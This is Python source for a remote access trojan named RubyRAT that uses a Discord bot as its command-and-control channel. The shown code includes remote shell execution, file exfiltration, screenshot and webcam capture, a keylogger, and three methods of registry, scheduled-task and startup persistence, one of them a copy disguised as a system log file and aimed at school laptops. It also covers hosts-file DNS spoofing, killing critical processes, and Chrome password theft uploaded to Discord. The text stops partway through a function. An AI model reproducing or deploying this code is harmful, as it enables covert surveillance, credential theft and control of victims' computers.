import os
import platform
import subprocess
import io
import socket
import sys
import shutil
import base64
import ctypes
import zipfile
import importlib

# Check if running as executable
running_as_executable = getattr(sys, 'frozen', False)


# List of required modules and their corresponding import names
required_modules = {
    'psutil': 'psutil',
    'discord': 'discord',
    'pyautogui': 'pyautogui',
    'pillow': 'PIL',
    'opencv-python-headless': 'cv2',
    'pynput': 'pynput',
    'requests': 'requests',
    'psutil': 'psutil',
    'cryptography': 'cryptography',
    'pygetwindow': 'pygetwindow',
    'googlemaps': 'googlemaps',
    'tkinter': 'tkinter',
    'mb': 'mb',
    'pywin32': 'win32crypt',
    'pycryptodomex': 'Cryptodome.Cipher',
    'winreg': 'winreg',
    'asyncio': 'asyncio',
}

# Additional required module
missing_modules = []

for module, import_name in required_modules.items():
    try:
        # Attempt to import the module
        importlib.import_module(import_name)
    except ImportError:
        # Module is missing, add it to the missing_modules list
        missing_modules.append(module)

# Check and install required modules if needed
if missing_modules:
    missing_modules_str = ", ".join(missing_modules)
    print(f"Some required modules are missing: {missing_modules_str}")
    print("Installing missing modules...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules_str.split(', '))
        print("Modules installed successfully!")
        # Determine the script filename dynamically
        script_filename = sys.argv[0]

        # Build the command to run the script with arguments
        script_command = [sys.executable, script_filename]

        # Start a new process to run the script
        subprocess.Popen(script_command)

        # Exit the current script
        sys.exit()
    except Exception as e:
        print("An error occurred while installing modules:", e)
        exit(1)
else:
    print("All required modules are already installed.")


import discord
from discord.ext import commands
import requests
import pyautogui
from cryptography.fernet import Fernet, InvalidToken
from pynput import keyboard
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from PIL import Image
import cv2
import pygetwindow as gw
import psutil
import googlemaps
from tkinter import messagebox as mb
import win32crypt
from Cryptodome.Cipher import AES
import csv
import json
import shutil
import base64
import sqlite3
import socket
import winreg
from pathlib import Path
import asyncio
import aiohttp

# Settings for build
installOnStart = False
askForUACOnStart = False
disableUACOnStart = False
hideConsoleOnStart = False

categorieName = "(Only for V1.8 and above)"
GOOGLE_API_KEY = "<GOOGLE-MAPS-API>"
currentVersion = "2.2.0"

# Tokens for the bot
primary_token = "(Only for V2.0.0 and above)"
alternative_token = "(Only for V2.0.0 and above)"

# Settings for presistence
registryName = "(Only for V1.9.5 and above)"
taskName = "(Only for V1.9.5 and above)"
startupName = "(Only for V1.9.5 and above)"
publicFileName = "(Only for V1.9.6 and above)"

#intents = discord.Intents.default()
intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)
created_channel = None  # To store the created channel object

script_path = os.path.abspath(__file__)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

    # Create encryption key
    key = Fernet.generate_key()
    global cipher_suite
    cipher_suite = Fernet(key)


    global created_channel  # Declare the global variable
    system_username = os.getlogin()  # Get the system's username

    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
    print(f'Public IP Address: {ip_address}')

    ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes

    # Create the perfect name for chat
    channel_name = f"{system_username}-{ip_address_with_dashes}"
    channel_name_lowercase = channel_name.replace('.', '').lower()

    guild = bot.guilds[0]  # Assuming the bot is in only one guild

    category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one
    print(f'Category Name: {categorieName}')

    # Execute the remove_channels function with the created_channel and channel_name
    await remove_channels(guild, channel_name_lowercase)

    # Find other active RubyRAT clients on local machine
    try:
        active_rubyRATs = await find_rubyrats()  # Await the coroutine here
        if len(active_rubyRATs) > 0:
            print("Found Python processes:")
            for process in active_rubyRATs:
                print(f"Process ID: {process['pid']}, Name: {process['name']}")
                print(f"Trying to kill process: {process}")
                await kill_process(process['pid'])  # Kill the process
        else:
            print("No Python processes found.")
    except Exception as e:
        print("An error occurred:", e)
    # Kill them...

    # Create a new text channel with the unique name
    if category is not None:
        created_channel = await guild.create_text_channel(channel_name, category=category)
    else:
        created_channel = await guild.create_text_channel(channel_name)
    print(f'Created Channel Name: {created_channel.name}')

    # Send a message with the public IP address to the new channel
    await created_channel.send(f"New client! (**Version is {currentVersion}**)\nPublic IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Process !cmd messages
    if message.channel == created_channel and message.content.startswith('!cmd'):
        command_args = message.content.split(' ', 1)
        if len(command_args) == 2:
            output = CallME(command_args[1])
            await message.channel.send(output)  # Send the output back to the chat

    # Process !download messages
    if message.channel == created_channel and message.content.startswith('!download'):
        file_name = message.content.split(' ', 1)[1]
        await DownloadFile(file_name, message.channel)

    await bot.process_commands(message)

async def remove_channels(guild, ChannelName):
    # Find the category with the specified name
    category = discord.utils.get(guild.categories, name=categorieName)

    if category is not None:
        # Iterate through text channels within the category
        for channel in category.text_channels:
            if channel.name == ChannelName:
                #await channel.send('!kill2')
                #print(f"Sent '!kill2' to channel: {channel.name}")

                #await asyncio.sleep(5)
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
    else:
        print(f"Category '{categorieName}' not found in this server.")

async def find_rubyrats():
    try:
        print("Trying to find RubyRATs...")
        python_processes = []

        # Get the current process ID of the script
        current_process_id = os.getpid()

        for process in psutil.process_iter(['pid', 'name']):
            process_info = process.info
            if "python" in process_info["name"].lower() and process_info["pid"] != current_process_id:
                # Check if the process name contains "python" and exclude the script's own process
                python_processes.append(process_info)

        return python_processes
    except Exception as e:
        print("An error occurred:", e)
        return []

async def kill_process(pid):
    try:
        process = psutil.Process(pid)
        process.terminate()  # Terminate the process
        print(f"Killed process with PID {pid}")
    except psutil.NoSuchProcess:
        print(f"Process with PID {pid} not found.")
    except Exception as e:
        print(f"An error occurred while killing the process with PID {pid}: {e}")

# Customize the built-in help command
bot.remove_command('help')  # Remove the default help command

@bot.command(pass_context=True)
async def help(ctx):
    global created_channel
    if ctx.channel == created_channel and ctx.message.content == '!help':
        help_messages = (
        f"**Available Commands on Version {currentVersion}:**\n"
        "\n**GENERAL**\n"
        "`!help` - Show this menu.\n"
        "`!cmd <command>` - Execute a shell command.\n"
        "`!restart` - Will disconnect and then hopefully reconnect the bot.\n"
        "`!version` - Prints out current version.\n"
        "`!kill` - Disconnect the bot and remove the chat channel.\n"

        "\n**FILE MANAGEMENT**\n"
        "`!download <filename>` - Download a file from the system.\n"
        "`!upload` - Upload a file to the bot.\n"
        "`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\n"

        "\n**SUVAILLANCE**\n"
        "`!screenshot` - Sends a frame of desktop from client to chat.\n"
        "`!webcam` - Takes a picture using clients webcam and sends it in chat.\n"
        "`!info` - Display some system information, such as GPU, CPU, RAM and more!.\n"
        "`!geolocate` - Calculates position using google maps API.\n"

        "\n**PERSISTENCE**\n"
        "`!elevate` - Will try to elevate client from user to admin.\n"
        "`!install` - Try to get presisence on client system.\n"
        "`!uninstall` - Will remove presisence from client system.\n"
        "`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\n"
        "`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\n"
        "`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\n"
        "`!cool_install` - Installs a interesting method of presistence that exploits some computers. (Will need admin)\n"
        "`!cool_uninstall` - Uninstalls a interesting method of presistence that exploits some computers. (Will need admin)\n"

        "\n**RECOVERY**\n"
        "`!history` - Gather and download all web history from client.\n",
        "`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\n"
        "`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\n"

        "\n**KEYLOGGER**\n"
        "`!dumplog` - Sends a file containing the keyloggers findings to C2.\n"
        "`!startlog` - Start the keylogging.\n"
        "`!stoplog` - Stop the keylogging.\n"

        "\n**ENCRYPTION**\n"
        "`!encrypt <filename> <password>` - Encrypt a file with a special password.\n"
        "`!decrypt <filename> <password>` - Decrypt a file with the special password.\n"

        "\n**DNS Spoofing**\n"
        "`!block_website <domain>` - Blocks a website on the clients computer.\n"
        "`!unblock_website <domain>` - Unblocks a website on the clients computer.\n"
        "`!spoof_dns <domain> <ip>` - Spoofs a domain to a specified IP.\n"

        "\n**MISC**\n"
        "`!volume <volume_procent>` - Changes volume to the given procentage.\n"
        "`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\n"
        "`!messagebox <error\warning\info> <title> <content>` - Sends a custom made messagebox to client.\n"
        "`!securefile <filepath>` - Nulls out file to make it near-impossible to recover.\n"
        "`!BSOD <svchost\explorer>` - Diffrent ways to make clients system unstable.\n"
        "`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \"dir\")\n"
        )
        for message in help_messages:
            await ctx.send(message)    

@bot.command()
async def kill(ctx):
    global created_channel
    if ctx.channel == created_channel and ctx.message.content == '!kill':
        await ctx.send("Disconnecting and removing chat channel...")
        if created_channel:
            await created_channel.delete()
        await bot.close()
        os._exit(0)

@bot.command()
async def info(ctx):
    if ctx.channel == created_channel and ctx.message.content == '!info':
        system_info = get_system_info()
        await ctx.send(f"System Information:\n```\n{system_info}\n```")

@bot.command()
async def screenshot(ctx):
    global created_channel
    if ctx.channel == created_channel and ctx.message.content == '!screenshot':
        try:
            # Capture the screenshot using pyautogui
            screenshot = pyautogui.screenshot()


            # Save the screenshot to a file
            screenshot_path = 'screenshot.png'
            screenshot.save(screenshot_path)

            # Upload the screenshot to Discord
            await ctx.send(file=discord.File(screenshot_path))

            # Remove the temporary file
            os.remove(screenshot_path)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

@bot.command()
async def webcam(ctx):
    global created_channel

    if ctx.channel == created_channel and ctx.message.content == '!webcam':
        try:
            # Initialize the webcam capture
            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam

            if cap.isOpened():
                # Capture a single frame from the webcam
                ret, frame = cap.read()

                if ret:
                    # Save the captured image to a file
                    image_path = 'webcam_image.png'
                    cv2.imwrite(image_path, frame)

                    # Upload the image to Discord
                    await ctx.send(file=discord.File(image_path))

                    # Remove the temporary image file
                    os.remove(image_path)

                else:
                    await ctx.send("Failed to capture image from webcam.")
            else:
                await ctx.send("Webcam not available.")

            # Release the webcam
            cap.release()

        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

@bot.command()
async def version(ctx):
    if ctx.channel == created_channel:    
        print(f"Version is {currentVersion}")
        await ctx.send(f"Current version is {currentVersion}")


# ---------------------------------------------------------------------------
#
#                            TEST ZONE STARTS HERE
#
# ---------------------------------------------------------------------------

@bot.command()
async def Startups(ctx):
    if ctx.channel == created_channel:
        if is_admin():
            await ctx.send("User has administrative privileges, starting to gather startup information...")

            # Get startup folder
            startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            startup_folder_files = os.listdir(startup_folder)
            startup_folder_files = [str(startup_folder / file) for file in startup_folder_files]

            # Get registry startup
            registry_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            registry_startup = []
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_READ) as registry:
                    index = 0
                    while True:
                        try:
                            value_name, value_data, value_type = winreg.EnumValue(registry, index)
                            registry_startup.append(value_data)
                            index += 1
                        except OSError:
                            break
            except Exception as e:
                await ctx.send(f"Error getting registry startup: {e}")

            # Get task scheduler startup
            task_scheduler_startup = []
            try:
                result = os.system(f'schtasks /query /tn {taskName}')
                if result == 0:
                    task_scheduler_startup.append(taskName)
            except Exception as e:
                await ctx.send(f"Error getting task scheduler startup: {e}")

            # Send startup information to chat
            await ctx.send("Startup information:")

            # Send registry startup items
            await ctx.send("**REGISTRY:**")
            for item in registry_startup:
                await ctx.send(f"• {item}")

            # Send task scheduler startup items
            await ctx.send("**TASK SCHEDULER:**")
            for item in task_scheduler_startup:
                await ctx.send(f"• {item}")

            # Send startup folder items
            await ctx.send("**STARTUP FOLDER:**")
            for item in startup_folder_files:
                await ctx.send(f"• {item}")

        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")


# ---------------------------------------------------------------------------
#
#                              TEST ZONE ENDS HERE
#
# ---------------------------------------------------------------------------

# DNS Stuff
@bot.command()
async def block_website(ctx, domain):
    if ctx.channel == created_channel:
        # Check if client is admin
        if is_admin():
            # Check if there is a domain
            if domain:
                try:
                    # Add the domain to the hosts file
                    with open('C:/Windows/System32/drivers/etc/hosts', 'a') as hosts_file:
                        hosts_file.write(f"\n127.0.0.1 {domain}")
                    await ctx.send(f"Successfully blocked {domain}.")
                    await ctx.send("Restarting DNS Client service...")
                    # Restart the DNS Client service
                    os.system('ipconfig /flushdns')
                    await ctx.send("DNS Client service restarted!")
                except:
                    await ctx.send("Failed to block website.")
        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
@bot.command()
async def unblock_website(ctx, domain):
    if ctx.channel == created_channel:
        # Check if client is admin
        if is_admin():
            # Check if there is a domain
            if domain:
                try:
                    # Remove the domain from the hosts file
                    with open('C:/Windows/System32/drivers/etc/hosts', 'r') as hosts_file:
                        lines = hosts_file.readlines()
                    with open('C:/Windows/System32/drivers/etc/hosts', 'w') as hosts_file:
                        for line in lines:
                            if line.startswith(f"127.0.0.1 {domain}"):
                                # Remove line
                                continue
                            hosts_file.write(line)
                    await ctx.send(f"Successfully unblocked {domain}.")
                    await ctx.send("Restarting DNS Client service...")
                    # Restart the DNS Client service
                    os.system('ipconfig /flushdns')
                    await ctx.send("DNS Client service restarted!")
                except:
                    await ctx.send("Failed to unblock website.")
        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
@bot.command()
async def spoof_dns(ctx, domain, ip):
    if ctx.channel == created_channel:
        # Check if client is admin
        if is_admin():
            # Check if there is a domain
            if domain:
                try:
                    # Add the domain to the hosts file
                    with open('C:/Windows/System32/drivers/etc/hosts', 'a') as hosts_file:
                        hosts_file.write(f"\n{ip} {domain}")
                    await ctx.send(f"Successfully spoofed {domain} to {ip}.")
                    await ctx.send("Restarting DNS Client service...")
                    # Restart the DNS Client service
                    os.system('ipconfig /flushdns')
                    await ctx.send("DNS Client service restarted!")
                except:
                    await ctx.send("Failed to spoof DNS.")
        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")


# Blue Screen Of Death
@bot.command()
async def BSOD(ctx, type):
    if type == "explorer":
        if ctx.channel == created_channel:
            if is_admin():
                await ctx.send("Starting BSOD...")
                os.system("taskkill /f /im explorer.exe")
                await ctx.send("BSOD started!")
            else:
                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
    elif type == "svchost":
        if ctx.channel == created_channel:
            if is_admin():
                await ctx.send("Starting BSOD...")
                os.system("taskkill /f /im svchost.exe")
                await ctx.send("BSOD started!")
            else:
                await ctx.send("You do not have the necessary administrative privileges to perform this operation. !elevate will help...")
    else:
        await ctx.send("Please specify a valid BSOD type. (explorer or svchost)")


# Cool presistence method that only works for the school laptops.
@bot.command()
async def cool_install(ctx):
    if ctx.channel == created_channel:
        if is_admin():
            await ctx.send("User has administrative privileges, starting to add persistence...")
            # Make a new copy with content of current file to "C:\Windows\security\database\system32.log"
            # Specify the script you want to run
            script_to_run = 'C:\\Windows\\security\\database\\system32.log'
            script_path = os.path.abspath(sys.argv[0])

            # Write your script content to the specified file
            shutil.copy(script_path, script_to_run)

            # Add registry that executes "pythonw C:\Windows\security\database\system32.log"
            registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
            registry_name = 'System32'
            registry_value = 'pythonw.exe ' + script_to_run

            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                    winreg.SetValueEx(registry, registry_name, 0, winreg.REG_SZ, registry_value)
                await ctx.send("Persistence added successfully.")
            except Exception as e:
                await ctx.send(f"Failed to add persistence: {str(e)}")
        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

# Removes the cool presistence method that only works for the school laptops.
@bot.command()
async def cool_uninstall(ctx):
    if ctx.channel == created_channel:
        if is_admin():
            await ctx.send("User has administrative privileges, starting to remove persistence...")

            # Remove registry key
            registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
            registry_name = 'System32'

            try:
                # Remove the System32.log file
                script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                os.remove(script_to_run)

                # Remove the registry key
                import winreg
                key = winreg.HKEY_CURRENT_USER
                with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                    winreg.DeleteValue(registry, registry_name)
                await ctx.send("Persistence removed successfully.")
            except Exception as e:
                await ctx.send(f"Failed to remove persistence: {str(e)}")
        else:
            await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

# Method to return true or false if cool persistence method is installed
def cool_persistence_exists():
    # Check if the registry key exists
    registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    registry_name = 'System32'

    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, registry_key, 0, winreg.KEY_READ) as registry:
            value, _ = winreg.QueryValueEx(registry, registry_name)
        return value == 'pythonw.exe C:\\Windows\\security\\database\\system32.log'
    except Exception as e:
        return False

# Better presistence method that uses 3 diffrent methods.
@bot.command()
async def better_install(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!better_install":
        script_path = os.path.abspath(sys.argv[0])

        try:
            # Check the current persistence status
            current_status = CheckBetterPersistence(script_path)

            response = "**Persistence Status:**\n"
            response += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
            response += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
            response += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

            await ctx.send(response)

            await ctx.send("\n**Starting...**\n")
            await ctx.send("Starting Duplicated Script phase...")
            # Check if the cloned script is in the public directory
            public_directory = Path('C:/Users/Public')
            copied_script_path = public_directory / (publicFileName + ".pyw")
            if (Path.exists(copied_script_path)):
                await ctx.send(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")
            else:
                await ctx.send("Duplicated Script is not in the public directory. Copying...")
                # Copy the script to the public directory
                shutil.copy(script_path, copied_script_path)
                await ctx.send(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")

            # Check and enable Registry Persistence if not already enabled
            if not current_status['registry_persistence']:
                try:
                    await ctx.send("Starting Registry Persistence phase...")
                    registry_persistence(script_path)
                    await ctx.send("Registry Persistence done!")
                except Exception as e:
                    await ctx.send(f"Error starting registry persistence: {e}")
            else:
                await ctx.send("Registry Persistence is already active.")

            # Check and enable Task Scheduler Persistence if not already enabled
            if not current_status['task_scheduler_persistence']:
                try:
                    await ctx.send("Starting Task Scheduler Persistence phase...")
                    task_scheduler_persistence(script_path)
                    await ctx.send("Task Scheduler Persistence done!")
                except Exception as e:
                    await ctx.send(f"Error starting task scheduler persistence: {e}")
            else:
                await ctx.send("Task Scheduler Persistence is already active.")

            # Check and enable Startup Persistence if not already enabled
            if not current_status['startup_persistence']:
                try:
                    await ctx.send("Starting Startup Persistence phase...")
                    startup_persistence(script_path)
                    await ctx.send("Startup Persistence done!")
                except Exception as e:
                    await ctx.send(f"Error starting startup persistence: {e}")
            else:
                await ctx.send("Startup Persistence is already active.")

            await ctx.send("\n**Done with all phases! \nChecking status...**\n")

            # Check the current persistence status
            current_status = CheckBetterPersistence(script_path)

            NewResponse = "**New Persistence Status:**\n"
            NewResponse += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
            NewResponse += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
            NewResponse += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

            await ctx.send(NewResponse)

        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

def registry_persistence(script_path):
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    # Copy the original script to C:\Users\Public
    public_directory = Path('C:/Users/Public')
    copied_script_path = public_directory / (publicFileName + ".pyw")
    shutil.copy(script_path, copied_script_path)

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))
    except Exception as e:
        print(f"Error adding registry persistence: {e}")

    #os.system(f'start /MIN "{copied_script_path}"')

def task_scheduler_persistence(script_path):
    # Automatically determine the username
    username = os.getlogin()

    # Get the directory of the currently running Python interpreter
    python_dir = Path(sys.executable).parent

    # Define a list of possible paths to search for pythonw.exe
    possible_paths = [
        python_dir / 'pythonw.exe',
        python_dir / 'pythonw3.11.exe',  # Assuming Python 3.11
        python_dir / 'pythonw3.9.exe',   # Assuming Python 3.9
        Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe'),  
        Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe'),  
        Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw.exe'), 
        Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe'), 
    ]

    # Find the first valid path to pythonw.exe
    pythonw_path = next((path for path in possible_paths if path.is_file()), None)

    if pythonw_path is None:
        print("pythonw.exe not found while searching for task scheduler persistence.")
        return None
    else:
        # Specify the path to the public directory
        public_directory = Path('C:/Users/Public')

        # Specify the path to place duplicate of script (Filename for duplicate is the "publicFileName" variable)
        copied_script_path = public_directory / (publicFileName + ".pyw")

        # Copy the script to the public directory
        shutil.copyfile(script_path, copied_script_path)

        # Use os.system to create a scheduled task
        os.system(f"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \"{pythonw_path} {copied_script_path}\" /RU {username} /f")

def startup_persistence(script_path):
    # Automatically determine the username
    username = os.getlogin()

    # Get the directory of the currently running Python interpreter
    python_dir = Path(sys.executable).parent

    # Define a list of possible paths to search for pythonw.exe
    possible_paths = [
        python_dir / 'pythonw.exe',
        python_dir / 'pythonw3.11.exe',  # Assuming Python 3.11
        python_dir / 'pythonw3.9.exe',   # Assuming Python 3.9
        Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe'),  
        Path(f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe'),  
        Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw.exe'), 
        Path(f'C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe'), 
    ]

    # Find the first valid path to pythonw.exe
    pythonw_path = next((path for path in possible_paths if path.is_file()), None)

    if pythonw_path is None:
        print("pythonw.exe not found while searching for task scheduler persistence.")
        return None
    else:
        public_directory = Path('C:/Users/Public')
        copied_script_path = public_directory / (publicFileName + ".pyw")
        shutil.copy(script_path, copied_script_path)

        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'

        with open(f'{startup_folder}/{startupName}.bat', 'w') as batch_file:
            batch_file.write(fr'''@echo off
    start "" /B "{pythonw_path}" "{copied_script_path}"
    :: @echo off
    :: start "" /B /MIN {pythonw_path} C:\Users\Public\{registryName}.pyw
    ''')

        os.system(f'copy {startupName}.bat "{startup_folder}"')
        os.remove(f'{startupName}.bat')


# Checking of pre
@bot.command()
async def better_check(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!better_check":
        script_path = os.path.abspath(sys.argv[0])
        # Check the current persistence status
        current_status = CheckBetterPersistence(script_path)
        response = "**Persistence Status:**\n"
        response += f"**Registry** Persistence: **{'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}** (Keyname is **{registryName}** and Actual filename is **{publicFileName}.pyw**)\n"
        response += f"**Task Scheduler** Persistence: **{'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}** (Taskname is **{taskName}** and Actual filename is **{publicFileName}.pyw**)\n"
        response += f"**Startup** Persistence: **{'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}** (Startup filename is **{startupName}.bat** and Actual filename is **{publicFileName}.pyw**)\n\n"

        await ctx.send(response)

def CheckBetterPersistence(script_path):
    registry_persistence_exists = check_registry_persistence(script_path)
    task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)
    startup_persistence_exists = check_startup_persistence(script_path)

    return {
        "registry_persistence": registry_persistence_exists,
        "task_scheduler_persistence": task_scheduler_persistence_exists,
        "startup_persistence": startup_persistence_exists,
    }

def check_registry_persistence(script_path):
    # Add your code to check registry persistence here
    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    public_directory = Path('C:/Users/Public')
    copied_script_path = public_directory / (publicFileName + ".pyw")

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:
            value, _ = winreg.QueryValueEx(registry_key, registryName)
            return value == str(copied_script_path)
    except Exception:
        return False

def check_task_scheduler_persistence(script_path):
    # Add your code to check task scheduler persistence here
    result = os.system(f'schtasks /query /tn {taskName}')
    return result == 0  # Task exists

def check_startup_persistence(script_path):
    # Add your code to check startup folder persistence here
    public_directory = Path('C:/Users/Public')
    copied_script_path = public_directory / (publicFileName + ".pyw")
    startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    shortcut_path = startup_folder / f'{startupName}.bat'

    return os.path.exists(str(shortcut_path))


# Uninstall
@bot.command()
async def better_uninstall(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!better_uninstall":
        script_path = os.path.abspath(sys.argv[0])

        try:
            # Check the current persistence status
            current_status = CheckBetterPersistence(script_path)

            # Check if the cloned script is in the public directory
            public_directory = Path('C:/Users/Public')
            copied_script_path = public_directory / (publicFileName + ".pyw")
            if (Path.exists(copied_script_path)):
                await ctx.send(f"Duplicated Script is in the public directory as expected, removing it...")
                # Remove the script from the public directory
                os.remove(copied_script_path)
                await ctx.send(f"Duplicated Script removed from public directory! Continuing...")
            else:
                await ctx.send("Hmm, Duplicated Script is not in the public directory.")    

            if current_status['registry_persistence']:
                try:
                    await ctx.send("Disabling Registry Persistence...")
                    remove_registry_persistence()
                    await ctx.send("Registry Persistence disabled.")
                except Exception as e:
                    await ctx.send(f"Error disabling registry persistence: {e}")

            if current_status['task_scheduler_persistence']:
                try:
                    await ctx.send("Removing Task Scheduler Persistence...")
                    remove_task_scheduler_persistence()
                    await ctx.send("Task Scheduler Persistence removed.")
                except Exception as e:
                    await ctx.send(f"Error removing task scheduler persistence: {e}")

            if current_status['startup_persistence']:
                try:
                    await ctx.send("Disabling Startup Persistence...")
                    remove_startup_persistence()
                    await ctx.send("Startup Persistence disabled.")
                except Exception as e:
                    await ctx.send(f"Error disabling startup persistence: {e}")

            await ctx.send("\n**Done with uninstalling persistence!**\n")

        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

# Add functions to remove persistence
def remove_registry_persistence():
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
            winreg.DeleteValue(registry_key, registryName)
    except Exception as e:
        print(f"Error removing registry persistence: {e}")

def remove_task_scheduler_persistence():
    os.system(f"schtasks /delete /tn {taskName} /f")

def remove_startup_persistence():
    startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    shortcut_path = startup_folder / f'{startupName}.bat'

    if os.path.exists(str(shortcut_path)):
        os.remove(str(shortcut_path))



USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

@bot.command()
async def passwords_chrome(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!passwords_chrome":
        await ctx.send("Grabbing passwords...")
        print("Chrome Password Decryptor by bytemafia")
        file_location = os.path.join(os.getcwd(), "passwords.csv") # Full file path
        with open(file_location, mode='w', newline='') as passfile: # Write file
            writer = csv.writer(passfile, delimiter=',')
            writer.writerow(["No      <->      URL      <->      Username      <->      Password"])
            secret_key = secretKey()
            default_folders = ("Profile", "Default")
            data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
            for data_folder in data_folders:
                db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
                con = login_db(db_path)
            if secret_key and con:
                cur = con.cursor()
                cur.execute("select action_url, username_value, password_value from logins")
                for index, data in enumerate(cur.fetchall()):
                    url = data[0]
                    username = data[1]
                    ciphertext = data[2]
                    if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                        password = password_decrypt(secret_key, ciphertext)
                        writer.writerow([index, url, username, password])
                print("Completed! File is at: " + file_location)
                con.close()
                os.remove(TEMP_DB)

        # Uploading the file to the Discord server channel
        with open(file_location, 'rb') as file:
            file = discord.File(file)
            await ctx.send("Here are the Chrome passwords:", file=file)

        # Remove the file after uploading
        os.remove(file_location)

# Collecting secret key
def secretKey():
    try:
        with open(LOCAL_STATE_PATH, "r") as f:
            local_state = f.read()
